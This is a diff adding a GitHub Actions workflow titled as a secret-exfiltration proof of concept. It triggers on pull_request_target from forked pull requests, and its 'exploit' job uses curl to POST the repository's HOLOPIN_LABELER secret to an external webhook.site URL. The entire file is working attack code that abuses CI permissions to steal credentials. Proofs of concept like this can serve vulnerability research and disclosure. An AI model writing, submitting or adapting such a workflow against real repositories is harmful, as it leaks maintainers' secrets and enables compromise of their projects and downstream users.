@@ -1,0 +1,21 @@
+name: GitHub Secret Exfiltration PoC
+
+on:
+  pull_request_target:
+    types: [opened]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Show that the PoC workflow is running
+        run: echo "[+] Workflow triggered by PR from fork"
+
+      - name: Try to exfiltrate HOLOPIN_LABELER secret
+        run: |
+          echo "[+] Sending secret to Webhook.site..."
+          curl -X POST \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -d "token=${{ secrets.HOLOPIN_LABELER }}" \
+            https://webhook.site/e4056cbe-33ad-4c73-a3f2-48b7b388a4f1
